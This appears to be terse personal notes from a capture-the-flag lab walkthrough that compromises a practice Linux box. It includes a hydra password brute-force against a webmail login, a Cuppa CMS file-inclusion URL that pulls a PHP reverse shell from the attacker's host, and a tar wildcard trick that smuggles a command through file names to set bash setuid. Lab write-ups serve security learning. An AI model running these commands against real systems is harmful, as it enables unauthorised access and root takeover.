# 10.10.208.206

The server has SMB running. 

Enum4linum found users:

milesdyson


Enum4linum has annoynous public share:
smbclient //192.168.1.100/anonymous -N guest


downloaded attention.txt and log files from anonymous share


# users
-Miles Dyson




# hydra 
hydra -l milesdyson -P log1.txt 10.10.209.100 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user" -V -I


mail server creds - http://10.10.209.100/squirrelmail/src/webmail.php:


milesdyson
cyborg007haloterminator



read emails and found smb creds


# SMB Creds
milesdyson
)s{A&2Z=F^n_E.B`


# connect to SMB:

there's an file in the SMB for milesdyson (in milesdyson share) @ notes/importat.txt
it conains path to hidden path in the website

http://10.10.208.206/45kra24zxs28v3yd/



# ffuf it:
ffuf -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.208.206/45kra24zxs28v3yd/FUZZ -fc 404



http://10.10.208.206/45kra24zxs28v3yd/administrator/ shows it's a cuppa csm


checking cuppa csm vulns, we find we can remote execute a php code:
http://10.10.208.206/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.47.37/php-reverse-shell.php

we get a shell and find the user flag: 


user flag: 7ce5c2109a40f958099283600a9ae807



There's a cron job running by root every minute and execute backup.sh which runs tar * command. so we can exploit it:

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/


cd /var/www/html
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1


and let the job run


/bin/bash -p



get the flag: 3f0372db24753accc7179a282cd6a949